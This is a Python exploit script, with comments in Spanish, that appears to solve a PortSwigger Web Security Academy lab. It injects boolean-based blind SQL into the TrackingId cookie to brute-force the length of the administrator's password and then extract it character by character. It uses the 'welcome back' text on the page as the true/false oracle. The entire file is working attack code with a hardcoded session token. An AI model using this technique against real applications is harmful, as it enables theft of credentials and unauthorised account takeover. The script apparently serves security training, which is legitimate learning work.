from pwn import *
import requests
import sys
import signal
import string
import time
from colorama import Fore

def def_handler(sig, frame):
    p1.failure("Ataque de fuerza bruta detenido")
    print(Fore.RED, "[!] Saliendo...\n",Fore.RESET)
    sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits
p1 = log.progress("SQLI")
p3= log.progress("Obteniendo el tamaño de la contraseña por Fuerza bruta")
time.sleep(0.5)

def get_password_length():

    for number in range(0,200):
        cookies = {
    "TrackingId": f"Db4lAzOgb2V0ietb' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = {number}-- -",
    "session": "ti8pHxDHxkqzehjqFRZGt6jIPIuDPGlL"
}

            
            
        r = requests.get("https://0a2400b2033d8a01862ea7df009b00cf.web-security-academy.net/",cookies=cookies)    
        p3.status(cookies["TrackingId"])
        if "welcome back" in r.text.lower():
            p3.status(Fore.GREEN + f"Tamaño de la contraseña: {number}" + Fore.RESET)
            return number


def make_sqli():

    length = get_password_length()
    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(0.5)
    
    password = ""

    p2 = log.progress("password")

    for position in range(1,length+1):
        
        for character in characters:
            cookies = {
                "TrackingId":f"Db4lAzOgb2V0ietb'and (select substring(password,{position},1) from users where username = 'administrator') = '{character}'-- -;",
                "session":"ti8pHxDHxkqzehjqFRZGt6jIPIuDPGlL"
            
            }

            p1.status(cookies["TrackingId"])
            r = requests.get("https://0a2400b2033d8a01862ea7df009b00cf.web-security-academy.net/",cookies=cookies)    
            if "welcome back" in r.text.lower():
                password += str(character)
                p2.status(password)
                break


if __name__ == "__main__":
    make_sqli()